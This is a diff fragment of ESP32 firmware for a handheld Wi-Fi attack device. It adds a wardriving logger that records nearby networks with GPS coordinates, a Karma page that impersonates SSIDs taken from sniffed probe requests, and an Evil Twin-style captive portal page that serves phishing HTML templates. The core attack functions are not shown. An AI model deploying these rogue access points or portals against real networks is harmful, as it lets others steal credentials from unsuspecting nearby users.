+        esp_err_t scan_err = wifi_scanner_start_scan();
+        if (scan_err != ESP_OK) {
+            ESP_LOGI(TAG, "Failed to start scan: %s", esp_err_to_name(scan_err));
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            continue;
+        }
+        
+        // Wait for scan to complete (non-blocking scan from wifi_scanner)
+        int timeout = 0;
+        while (!wifi_scanner_is_done() && timeout < 200) {  // 20 seconds timeout
+            vTaskDelay(pdMS_TO_TICKS(100));
+            timeout++;
+            if (!wardrive_active) break;
+        }
+        
+        if (!wardrive_active) break;
+        
+        // Get scan results from wifi_scanner
+        int scan_count = wifi_scanner_get_results(wardrive_scan_results, MAX_AP_CNT);
+        
+        ESP_LOGI(TAG, "Wardrive: scanned %d networks", scan_count);
+        
+        // Get timestamp
+        char timestamp[32];
+        get_timestamp_string(timestamp, sizeof(timestamp));
+        
+        // Process scan results and write to already-open file
+        for (int i = 0; i < scan_count; i++) {
+            wifi_ap_record_t *ap = &wardrive_scan_results[i];
+            
+            char mac_str[18];
+            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                    ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                    ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+            
+            char escaped_ssid[64];
+            escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
+            
+            const char* auth_mode = get_auth_mode_wiggle(ap->authmode);
+            
+            char line[512];
+            if (current_gps.valid) {
+                snprintf(line, sizeof(line), 
+                        "%s,%s,[%s],%s,%d,%d,%.7f,%.7f,%.2f,%.2f,WIFI\n",
+                        mac_str, escaped_ssid, auth_mode, timestamp,
+                        ap->primary, ap->rssi,
+                        current_gps.latitude, current_gps.longitude,
+                        current_gps.altitude, current_gps.accuracy);
+            } else {
+                snprintf(line, sizeof(line), 
+                        "%s,%s,[%s],%s,%d,%d,0.0000000,0.0000000,0.00,0.00,WIFI\n",
+                        mac_str, escaped_ssid, auth_mode, timestamp,
+                        ap->primary, ap->rssi);
+            }
+            
+            fprintf(file, "%s", line);
+        }
+        
+        // Flush instead of close to ensure data is written but keep file open
+        fflush(file);
+        
+        if (scan_count > 0) {
+            ESP_LOGI(TAG, "Logged %d networks to %s", scan_count, filename);
+        }
+        
+        scan_counter++;
+        
+        if (!wardrive_active) {
+            ESP_LOGI(TAG, "Wardrive: Stop requested");
+            break;
+        }
+        
+        vTaskDelay(pdMS_TO_TICKS(5000)); // Wait 5 seconds between scans
+    }
+    
+    // Close file only once at the end
+    if (file) {
+        fclose(file);
+    }
+    
+    wardrive_active = false;
+    wardrive_task_handle = NULL;
+    ESP_LOGI(TAG, "Wardrive stopped after %d scans. Last file: w%d.log", scan_counter, wardrive_file_counter);
+    
+    vTaskDelete(NULL);
+}
+
+static void wardrive_start_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Set wardrive UI active flag
+    wardrive_ui_active = true;
+    scan_done_ui_flag = false;
+    
+    // Delete the warning page content
+    if (function_page) {
+        lv_obj_clean(function_page);
+    }
+    
+    // Create log display page
+    wardrive_log_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(wardrive_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
+    lv_obj_align(wardrive_log_ta, LV_ALIGN_TOP_MID, 0, 30);
+    lv_textarea_set_text(wardrive_log_ta, "Starting Wardrive...\n");
+    lv_obj_set_style_bg_color(wardrive_log_ta, lv_color_make(0, 0, 0), 0);
+    lv_obj_set_style_text_color(wardrive_log_ta, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_color(wardrive_log_ta, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_width(wardrive_log_ta, 2, 0);
+    lv_obj_clear_state(wardrive_log_ta, LV_STATE_FOCUSED);
+    
+    // Create Stop button at bottom
+    wardrive_stop_btn = lv_btn_create(function_page);
+    lv_obj_set_size(wardrive_stop_btn, lv_pct(100), 45);
+    lv_obj_align(wardrive_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(wardrive_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(wardrive_stop_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);
+    lv_obj_set_style_border_color(wardrive_stop_btn, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_width(wardrive_stop_btn, 3, 0);
+    lv_obj_t *stop_lbl = lv_label_create(wardrive_stop_btn);
+    lv_label_set_text(stop_lbl, "Stop");
+    lv_obj_set_style_text_color(stop_lbl, lv_color_make(0, 255, 0), 0);
+    lv_obj_center(stop_lbl);
+    lv_obj_add_event_cb(wardrive_stop_btn, wardrive_stop_btn_cb, LV_EVENT_CLICKED, NULL);
+    
+    // Enable log capture
+    wardrive_enable_log_capture();
+    
+    // Start wardrive task
+    if (wardrive_active || wardrive_task_handle != NULL) {
+        ESP_LOGI(TAG, "Wardrive already running");
+        return;
+    }
+    
+    ESP_LOGI(TAG, "Starting Wardrive...");
+    wardrive_active = true;
+    
+    // Allocate wardrive task stack from PSRAM
+    wardrive_task_stack = (StackType_t *)heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    if (wardrive_task_stack != NULL) {
+        wardrive_task_handle = xTaskCreateStatic(wardrive_task, "wardrive_task", 8192, NULL, 
+            5, wardrive_task_stack, &wardrive_task_buffer);
+        if (wardrive_task_handle == NULL) {
+            ESP_LOGE(TAG, "Failed to create wardrive task");
+            heap_caps_free(wardrive_task_stack);
+            wardrive_task_stack = NULL;
+        } else {
+            ESP_LOGI(TAG, "Wardrive task created with PSRAM stack");
+        }
+    } else {
+        ESP_LOGE(TAG, "Failed to allocate wardrive task stack from PSRAM");
+    }
+}
+
+static void wardrive_stop_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Stop wardrive
+    if (wardrive_active || wardrive_task_handle != NULL) {
+        ESP_LOGI(TAG, "Stopping Wardrive...");
+        wardrive_active = false;
+        
+        for (int i = 0; i < 20 && wardrive_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        if (wardrive_task_handle != NULL) {
+            vTaskDelete(wardrive_task_handle);
+            wardrive_task_handle = NULL;
+            // Free PSRAM stack
+            if (wardrive_task_stack != NULL) {
+                heap_caps_free(wardrive_task_stack);
+                wardrive_task_stack = NULL;
+            }
+        }
+        
+        ESP_LOGI(TAG, "Wardrive stopped");
+    }
+    
+    wardrive_disable_log_capture();
+    wardrive_log_ta = NULL;
+    wardrive_stop_btn = NULL;
+    wardrive_ui_active = false;
+    scan_done_ui_flag = false;
+    nav_to_menu_flag = true;
+}
+
+static void show_karma_page(void)
+{
+    create_function_page_base("Karma");
+    wifi_attacks_refresh_sd_html_list();
+
+    karma_content = lv_obj_create(function_page);
+    lv_obj_set_size(karma_content, lv_pct(100), LCD_V_RES - 30);
+    lv_obj_align(karma_content, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_opa(karma_content, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(karma_content, 0, 0);
+    lv_obj_set_style_pad_all(karma_content, 10, 0);
+    lv_obj_set_style_pad_gap(karma_content, 10, 0);
+    lv_obj_set_flex_flow(karma_content, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(karma_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+
+    // Probe Requests dropdown
+    lv_obj_t *probe_label = lv_label_create(karma_content);
+    lv_label_set_text(probe_label, "Probe Request SSID:");
+    lv_obj_set_style_text_font(probe_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(probe_label, lv_color_make(0, 255, 0), 0);  // Green text
+
+    karma_probe_dd = lv_dropdown_create(karma_content);
+    lv_obj_set_width(karma_probe_dd, lv_pct(100));
+    lv_dropdown_set_dir(karma_probe_dd, LV_DIR_BOTTOM);
+    // Retro terminal styling for dropdown
+    lv_obj_set_style_bg_color(karma_probe_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
+    lv_obj_set_style_text_color(karma_probe_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green text
+    lv_obj_set_style_border_color(karma_probe_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green border
+    lv_obj_t *dd_list1 = lv_dropdown_get_list(karma_probe_dd);
+    if (dd_list1) {
+        lv_obj_set_style_bg_color(dd_list1, lv_color_make(0, 0, 0), 0);  // Black background for list
+        lv_obj_set_style_text_color(dd_list1, lv_color_make(0, 255, 0), 0);  // Green text for list
+        lv_obj_set_style_border_color(dd_list1, lv_color_make(0, 255, 0), 0);  // Green border
+    }
+
+    // Get probe requests from sniffer
+    int probe_count = 0;
+    const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
+    
+    // Build probe options
+    size_t probe_buf_size = (probe_count > 0 ? probe_count : 1) * 64;
+    char *probe_options = (char *)lv_mem_alloc(probe_buf_size);
+    if (!probe_options) {
+        probe_options = "Run Sniffer first to capture probe requests";
+    }
+
+    size_t probe_len = 0;
+    if (probe_options != (char *)"Run Sniffer first to capture probe requests") {
+        probe_options[0] = '\0';
+    }
+
+    int valid_probes = 0;
+    for (int i = 0; i < probe_count && i < MAX_PROBE_REQUESTS; i++) {
+        if (probes[i].ssid[0] == '\0') {
+            continue;  // Skip broadcast probes
+        }
+        
+        // Check if this SSID already exists in the list (skip duplicates)
+        bool is_duplicate = false;
+        if (probe_options != (char *)"Run Sniffer first to capture probe requests" && probe_len > 0) {
+            // Create a temporary copy to search
+            char *search_pos = probe_options;
+            char search_pattern[65];
+            snprintf(search_pattern, sizeof(search_pattern), "%s\n", probes[i].ssid);
+            if (strstr(search_pos, search_pattern) != NULL) {
+                is_duplicate = true;
+            }
+        }
+        
+        if (is_duplicate) {
+            continue;  // Skip duplicate SSID
+        }
+        
+        char entry[64];
+        snprintf(entry, sizeof(entry), "%s\n", probes[i].ssid);
+        size_t entry_len = strlen(entry);
+        if (probe_options != (char *)"Run Sniffer first to capture probe requests" && probe_len + entry_len < probe_buf_size) {
+            memcpy(probe_options + probe_len, entry, entry_len);
+            probe_len += entry_len;
+            probe_options[probe_len] = '\0';
+            valid_probes++;
+        }
+    }
+
+    if (valid_probes == 0) {
+        if (probe_options != (char *)"Run Sniffer first to capture probe requests") {
+            snprintf(probe_options, probe_buf_size, "Run Sniffer first to capture probe requests");
+        }
+    }
+
+    lv_dropdown_set_options(karma_probe_dd, probe_options);
+    lv_dropdown_set_selected(karma_probe_dd, 0);
+
+    if (probe_options != (char *)"Run Sniffer first to capture probe requests") {
+        lv_mem_free(probe_options);
+    }
+
+    // HTML dropdown (same as Evil Twin)
+    lv_obj_t *html_label = lv_label_create(karma_content);
+    lv_label_set_text(html_label, "HTML Portal");
+    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(html_label, lv_color_make(0, 255, 0), 0);  // Green text
+
+    karma_html_dd = lv_dropdown_create(karma_content);
+    lv_obj_set_width(karma_html_dd, lv_pct(100));
+    lv_dropdown_set_dir(karma_html_dd, LV_DIR_BOTTOM);
+    // Retro terminal styling for dropdown
+    lv_obj_set_style_bg_color(karma_html_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
+    lv_obj_set_style_text_color(karma_html_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green text
+    lv_obj_set_style_border_color(karma_html_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green border
+    lv_obj_t *dd_list2 = lv_dropdown_get_list(karma_html_dd);
+    if (dd_list2) {
+        lv_obj_set_style_bg_color(dd_list2, lv_color_make(0, 0, 0), 0);  // Black background for list
+        lv_obj_set_style_text_color(dd_list2, lv_color_make(0, 255, 0), 0);  // Green text for list
+        lv_obj_set_style_border_color(dd_list2, lv_color_make(0, 255, 0), 0);  // Green border
+    }
+
+    int html_total = wifi_attacks_get_sd_html_count();
+    size_t max_html = (html_total < SCAN_RESULTS_MAX_DISPLAY) ? html_total : SCAN_RESULTS_MAX_DISPLAY;
+    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
+    char *html_options = (char *)lv_mem_alloc(html_buf_size);
+    if (!html_options) {
+        html_options = "No HTML templates";
+        max_html = 0;
+    }
+
+    size_t html_len = 0;
+    if (html_options != (char *)"No HTML templates") {
+        html_options[0] = '\0';
+    }
+
+    int evil_twin_html_count = 0;
+    for (int i = 0; i < html_total && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
+        const char *name = wifi_attacks_get_sd_html_name(i);
+        if (!name) {
+            continue;
+        }
+        char entry[64];
+        const char *display = strrchr(name, '/');
+        if (display) {
+            display++;
+        } else {
+            display = name;
+        }
+        snprintf(entry, sizeof(entry), "%s\n", display);
+        size_t entry_len = strlen(entry);
+        if (html_options != (char *)"No HTML templates" && html_len + entry_len < html_buf_size) {
+            memcpy(html_options + html_len, entry, entry_len);
+            html_len += entry_len;
+            html_options[html_len] = '\0';
+            evil_twin_html_count++;
+        }
+    }
+
+    if (evil_twin_html_count == 0) {
+        if (html_options != (char *)"No HTML templates") {
+            snprintf(html_options, html_buf_size, "No HTML templates");
+        }
+    }
+
+    lv_dropdown_set_options(karma_html_dd, html_options);
+    lv_dropdown_set_selected(karma_html_dd, 0);
+
+    if (html_options != (char *)"No HTML templates") {
+        lv_mem_free(html_options);
+    }
+
+    // Start Karma button
+    karma_start_btn = lv_btn_create(karma_content);
+    lv_obj_set_width(karma_start_btn, lv_pct(100));
+    lv_obj_set_height(karma_start_btn, 40);
+    // Retro terminal styling for button with visible border
+    lv_obj_set_style_bg_color(karma_start_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
+    lv_obj_set_style_bg_color(karma_start_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+    lv_obj_set_style_border_color(karma_start_btn, lv_color_make(0, 255, 0), 0);  // Green border
+    lv_obj_set_style_border_width(karma_start_btn, 3, 0);  // Thick border (3px)
+    lv_obj_set_style_border_opa(karma_start_btn, LV_OPA_COVER, 0);  // Fully opaque border
+    lv_obj_add_event_cb(karma_start_btn, karma_start_btn_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *start_label = lv_label_create(karma_start_btn);
+    lv_label_set_text(start_label, "Start Karma");
+    lv_obj_set_style_text_color(start_label, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_center(start_label);
+
+    // Disable button if no probes or no HTML
+    if (valid_probes == 0 || evil_twin_html_count == 0) {
+        lv_obj_add_state(karma_start_btn, LV_STATE_DISABLED);
+    }
+}
+
+static void karma_start_btn_cb(lv_event_t *e)
+{
+    (void)e;
+
+    if (!karma_probe_dd || !karma_html_dd) {
+        return;
+    }
+
+    // Get selected probe request
+    int probe_sel = lv_dropdown_get_selected(karma_probe_dd);
+    int html_sel = lv_dropdown_get_selected(karma_html_dd);
+
+    int probe_count = 0;
+    const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
+    
+    if (!probes || probe_count == 0) {
+        ESP_LOGW(TAG, "No probe requests available");
+        return;
+    }
+
+    // Find selected SSID from probes (skip broadcast probes)
+    char selected_ssid[33] = {0};
+    int valid_probe_index = -1;
+    int current_valid = 0;
+    for (int i = 0; i < probe_count && i < MAX_PROBE_REQUESTS; i++) {
+        if (probes[i].ssid[0] == '\0') {
+            continue;  // Skip broadcast
+        }
+        if (current_valid == probe_sel) {
+            strncpy(selected_ssid, probes[i].ssid, sizeof(selected_ssid) - 1);
+            valid_probe_index = i;
+            break;
+        }
+        current_valid++;
+    }
+
+    if (valid_probe_index < 0 || selected_ssid[0] == '\0') {
+        ESP_LOGW(TAG, "Invalid probe selection");
+        return;
+    }
+
+    // Get HTML file
+    int html_count = wifi_attacks_get_sd_html_count();
+    if (html_sel < 0 || html_sel >= html_count) {
+        ESP_LOGW(TAG, "Invalid HTML selection");
+        return;
+    }
+
+    const char *html_name = wifi_attacks_get_sd_html_name(html_sel);
+
+    ESP_LOGI(TAG, "Starting Karma for SSID: %s", selected_ssid);
+
+    // Create log display page
+    create_function_page_base("Karma Log");
+
+    karma_log_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(karma_log_ta, lv_pct(100), LCD_V_RES - 30 - 45);  // Leave space for Stop button
+    lv_obj_align(karma_log_ta, LV_ALIGN_TOP_MID, 0, 30);
+    lv_textarea_set_one_line(karma_log_ta, false);
+    lv_textarea_set_cursor_click_pos(karma_log_ta, false);
+    lv_textarea_set_password_mode(karma_log_ta, false);
+    lv_textarea_set_text(karma_log_ta, "");
+    // Retro terminal styling
+    lv_obj_set_style_bg_color(karma_log_ta, lv_color_make(0, 0, 0), 0);  // Black background
+    lv_obj_set_style_text_color(karma_log_ta, lv_color_make(0, 255, 0), 0);  // Green text
+
+    // Stop button at the bottom
+    karma_stop_btn = lv_btn_create(function_page);
+    lv_obj_set_size(karma_stop_btn, lv_pct(100), 40);
+    lv_obj_align(karma_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(karma_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(karma_stop_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);
+    lv_obj_set_style_border_color(karma_stop_btn, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_width(karma_stop_btn, 3, 0);
+    lv_obj_add_event_cb(karma_stop_btn, karma_stop_btn_cb, LV_EVENT_CLICKED, NULL);
+    
+    lv_obj_t *stop_label = lv_label_create(karma_stop_btn);
+    lv_label_set_text(stop_label, "Stop");
+    lv_obj_set_style_text_color(stop_label, lv_color_make(0, 255, 0), 0);
+    lv_obj_center(stop_label);
+
+    karma_ui_active = true;
+
+    if (karma_enable_log_capture() != ESP_OK) {
+        lv_textarea_add_text(karma_log_ta, "Failed to initialize log capture\n");
+        return;
+    }
+
+    char header[160];
+    snprintf(header, sizeof(header), "Launching Karma for %s\n", selected_ssid);
+    lv_textarea_add_text(karma_log_ta, header);
+    lv_textarea_set_cursor_pos(karma_log_ta, LV_TEXTAREA_CURSOR_LAST);
+
+    if (html_name) {
+        const char *html_display = strrchr(html_name, '/');
+        if (html_display) {
+            html_display++;
+        } else {
+            html_display = html_name;
+        }
+
+        esp_err_t html_res = wifi_attacks_select_sd_html(html_sel);
+        if (html_res != ESP_OK) {
+            char warn[120];
+            snprintf(warn, sizeof(warn), "Failed to set portal template: %s\n", esp_err_to_name(html_res));
+            lv_textarea_add_text(karma_log_ta, warn);
+        } else {
+            char msg[120];
+            snprintf(msg, sizeof(msg), "Portal template: %s\n", html_display);
+            lv_textarea_add_text(karma_log_ta, msg);
+        }
+    }
+
+    // Start portal with the selected SSID
+    esp_err_t start_res = wifi_attacks_start_portal(selected_ssid);
+    if (start_res != ESP_OK) {
+        char err[96];
+        snprintf(err, sizeof(err), "Start failed: %s\n", esp_err_to_name(start_res));
+        lv_textarea_add_text(karma_log_ta, err);
+        karma_disable_log_capture();
+        karma_ui_active = false;
+        return;
+    }
+
+    lv_textarea_add_text(karma_log_ta, "Karma started. Awaiting log output...\n");
+    lv_textarea_set_cursor_pos(karma_log_ta, LV_TEXTAREA_CURSOR_LAST);
+}
+
+static void karma_stop_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    ESP_LOGI(TAG, "Stopping Karma...");
+    wifi_attacks_stop_portal();
+    
+    karma_disable_log_capture();
+    karma_log_ta = NULL;
+    karma_stop_btn = NULL;
+    karma_ui_active = false;
+    
+    nav_to_menu_flag = true;
+}
+
+static void portal_ssid_ta_event_cb(lv_event_t *e)
+{
+    (void)e;
+    // Show keyboard when text area is clicked
+    if (portal_keyboard) {
+        lv_obj_clear_flag(portal_keyboard, LV_OBJ_FLAG_HIDDEN);
+        ESP_LOGI(TAG, "Keyboard shown");
+    }
+}
+
+static void portal_keyboard_event_cb(lv_event_t *e)
+{
+    lv_event_code_t code = lv_event_get_code(e);
+    lv_obj_t *ta = lv_event_get_user_data(e);
+    
+    if (code == LV_EVENT_VALUE_CHANGED) {
+        // Update buffer when text changes
+        const char *txt = lv_textarea_get_text(ta);
+        if (txt) {
+            strncpy(portal_ssid_buffer, txt, sizeof(portal_ssid_buffer) - 1);
+            portal_ssid_buffer[sizeof(portal_ssid_buffer) - 1] = '\0';
+        }
+    }
+    else if (code == LV_EVENT_READY || code == LV_EVENT_CANCEL) {
+        // Hide keyboard when "Close" button is pressed
+        if (portal_keyboard) {
+            lv_obj_add_flag(portal_keyboard, LV_OBJ_FLAG_HIDDEN);
+            ESP_LOGI(TAG, "Keyboard hidden");
+        }
+    }
+}
+
+static void show_portal_page(void)
+{
+    create_function_page_base("Portal");
+    wifi_attacks_refresh_sd_html_list();
+
+    portal_content = lv_obj_create(function_page);
+    lv_obj_set_size(portal_content, lv_pct(100), LCD_V_RES - 30);
+    lv_obj_align(portal_content, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_opa(portal_content, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(portal_content, 0, 0);
+    lv_obj_set_style_pad_all(portal_content, 10, 0);
+    lv_obj_set_style_pad_gap(portal_content, 10, 0);
+    lv_obj_set_flex_flow(portal_content, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(portal_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+
+    // SSID text area with keyboard
+    lv_obj_t *ssid_label = lv_label_create(portal_content);
+    lv_label_set_text(ssid_label, "Portal SSID:");
+    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(ssid_label, lv_color_make(0, 255, 0), 0);  // Green text
+
+    portal_ssid_ta = lv_textarea_create(portal_content);
+    lv_obj_set_width(portal_ssid_ta, lv_pct(100));
+    lv_textarea_set_one_line(portal_ssid_ta, true);
+    lv_textarea_set_text(portal_ssid_ta, portal_ssid_buffer);
+    lv_obj_set_style_bg_color(portal_ssid_ta, lv_color_make(0, 0, 0), 0);  // Black background
+    lv_obj_set_style_text_color(portal_ssid_ta, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_set_style_border_color(portal_ssid_ta, lv_color_make(0, 255, 0), 0);  // Green border
+    
+    // Add event to show keyboard when text area is clicked
+    lv_obj_add_event_cb(portal_ssid_ta, portal_ssid_ta_event_cb, LV_EVENT_CLICKED, NULL);
+
+    // Create keyboard with close button
+    portal_keyboard = lv_keyboard_create(function_page);
+    lv_keyboard_set_textarea(portal_keyboard, portal_ssid_ta);
+    lv_keyboard_set_mode(portal_keyboard, LV_KEYBOARD_MODE_TEXT_LOWER);  // Text mode with close button
+    lv_obj_set_size(portal_keyboard, lv_pct(100), lv_pct(40));
+    lv_obj_align(portal_keyboard, LV_ALIGN_BOTTOM_MID, 0, 0);
+    
+    // Keyboard background - black
+    lv_obj_set_style_bg_color(portal_keyboard, lv_color_make(0, 0, 0), LV_PART_MAIN);
+    lv_obj_set_style_text_color(portal_keyboard, lv_color_make(0, 255, 0), LV_PART_MAIN);
+    
+    // Keyboard buttons - green with black background
+    lv_obj_set_style_bg_color(portal_keyboard, lv_color_make(0, 100, 0), LV_PART_ITEMS);  // Dark green buttons
+    lv_obj_set_style_bg_color(portal_keyboard, lv_color_make(0, 150, 0), LV_PART_ITEMS | LV_STATE_PRESSED);  // Lighter green when pressed
+    lv_obj_set_style_text_color(portal_keyboard, lv_color_make(0, 255, 0), LV_PART_ITEMS);  // Bright green text
+    lv_obj_set_style_border_color(portal_keyboard, lv_color_make(0, 255, 0), LV_PART_ITEMS);  // Green border
+    lv_obj_set_style_border_width(portal_keyboard, 1, LV_PART_ITEMS);
+    
+    lv_obj_add_event_cb(portal_keyboard, portal_keyboard_event_cb, LV_EVENT_VALUE_CHANGED, portal_ssid_ta);
+    
+    // Add event to hide keyboard when "Close" (OK) button is pressed
+    lv_obj_add_event_cb(portal_keyboard, portal_keyboard_event_cb, LV_EVENT_READY, portal_ssid_ta);
+
+    // HTML dropdown
+    lv_obj_t *html_label = lv_label_create(portal_content);
+    lv_label_set_text(html_label, "HTML Portal");
+    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(html_label, lv_color_make(0, 255, 0), 0);  // Green text
+
+    portal_html_dd = lv_dropdown_create(portal_content);
+    lv_obj_set_width(portal_html_dd, lv_pct(100));
+    lv_dropdown_set_dir(portal_html_dd, LV_DIR_BOTTOM);
+    // Retro terminal styling for dropdown
+    lv_obj_set_style_bg_color(portal_html_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
+    lv_obj_set_style_text_color(portal_html_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green text
+    lv_obj_set_style_border_color(portal_html_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green border
+    lv_obj_t *dd_list = lv_dropdown_get_list(portal_html_dd);
+    if (dd_list) {
+        lv_obj_set_style_bg_color(dd_list, lv_color_make(0, 0, 0), 0);  // Black background for list
+        lv_obj_set_style_text_color(dd_list, lv_color_make(0, 255, 0), 0);  // Green text for list
+        lv_obj_set_style_border_color(dd_list, lv_color_make(0, 255, 0), 0);  // Green border
+    }
+
+    int html_total = wifi_attacks_get_sd_html_count();
+    size_t max_html = (html_total < SCAN_RESULTS_MAX_DISPLAY) ? html_total : SCAN_RESULTS_MAX_DISPLAY;
+    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
+    char *html_options = (char *)lv_mem_alloc(html_buf_size);
+    if (!html_options) {
+        html_options = "No HTML templates";
+        max_html = 0;
+    }
+
+    size_t html_len = 0;
+    if (html_options != (char *)"No HTML templates") {
+        html_options[0] = '\0';
+    }
+
+    int portal_html_count = 0;
+    for (int i = 0; i < html_total && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
+        const char *name = wifi_attacks_get_sd_html_name(i);
+        if (!name) {
+            continue;
+        }
+        char entry[64];
+        const char *display = strrchr(name, '/');
+        if (display) {
+            display++;
+        } else {
+            display = name;
+        }
+        snprintf(entry, sizeof(entry), "%s\n", display);
+        size_t entry_len = strlen(entry);
+        if (html_options != (char *)"No HTML templates" && html_len + entry_len < html_buf_size) {
+            memcpy(html_options + html_len, entry, entry_len);
+            html_len += entry_len;
+            html_options[html_len] = '\0';
+            portal_html_count++;
+        }
+    }
+
+    if (portal_html_count == 0) {
+        if (html_options != (char *)"No HTML templates") {
+            snprintf(html_options, html_buf_size, "No HTML templates");
+        }
+    }
+
+    lv_dropdown_set_options(portal_html_dd, html_options);
+    lv_dropdown_set_selected(portal_html_dd, 0);
+
+    if (html_options != (char *)"No HTML templates") {
+        lv_mem_free(html_options);
+    }
+
+    // Start Portal button
+    portal_start_btn = lv_btn_create(portal_content);
+    lv_obj_set_width(portal_start_btn, lv_pct(100));
+    lv_obj_set_height(portal_start_btn, 40);
+    // Retro terminal styling for button with visible border
+    lv_obj_set_style_bg_color(portal_start_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
+    lv_obj_set_style_bg_color(portal_start_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+    lv_obj_set_style_border_color(portal_start_btn, lv_color_make(0, 255, 0), 0);  // Green border
+    lv_obj_set_style_border_width(portal_start_btn, 3, 0);  // Thick border (3px)
+    lv_obj_set_style_border_opa(portal_start_btn, LV_OPA_COVER, 0);  // Fully opaque border
+    lv_obj_add_event_cb(portal_start_btn, portal_start_btn_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *start_label = lv_label_create(portal_start_btn);
+    lv_label_set_text(start_label, "Start Portal");
+    lv_obj_set_style_text_color(start_label, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_center(start_label);
+
+    // Disable button if no HTML
+    if (portal_html_count == 0) {
+        lv_obj_add_state(portal_start_btn, LV_STATE_DISABLED);
+    }
+}
+
+static void portal_start_btn_cb(lv_event_t *e)
+{
+    (void)e;
+
+    if (!portal_ssid_ta || !portal_html_dd) {
+        return;
+    }
+
+    // Get SSID from text area
+    const char *ssid = lv_textarea_get_text(portal_ssid_ta);
+    if (!ssid || strlen(ssid) == 0) {
+        ESP_LOGW(TAG, "Portal SSID cannot be empty");
+        return;
+    }
+
+    // Update buffer
+    strncpy(portal_ssid_buffer, ssid, sizeof(portal_ssid_buffer) - 1);
+    portal_ssid_buffer[sizeof(portal_ssid_buffer) - 1] = '\0';
+
+    // Get HTML file
+    int html_sel = lv_dropdown_get_selected(portal_html_dd);
+    int html_count = wifi_attacks_get_sd_html_count();
+    if (html_sel < 0 || html_sel >= html_count) {
+        ESP_LOGW(TAG, "Invalid HTML selection");
+        return;
+    }
+
+    const char *html_name = wifi_attacks_get_sd_html_name(html_sel);
+
+    ESP_LOGI(TAG, "Starting Portal with SSID: %s", portal_ssid_buffer);
+
+    // Hide keyboard before creating new page
+    if (portal_keyboard) {
+        lv_obj_del(portal_keyboard);
+        portal_keyboard = NULL;
+    }
+
+    // Select HTML template
+    if (html_name) {
+        esp_err_t html_res = wifi_attacks_select_sd_html(html_sel);
+        if (html_res != ESP_OK) {
+            ESP_LOGW(TAG, "Failed to set portal template: %s", esp_err_to_name(html_res));
+        }
+    }
+
+    // Start portal
+    esp_err_t start_res = wifi_attacks_start_portal(portal_ssid_buffer);
+    if (start_res != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to start portal: %s", esp_err_to_name(start_res));
+        return;
+    }
+
+    ESP_LOGI(TAG, "Portal started successfully");
+    nav_to_menu_flag = true;
+}
+
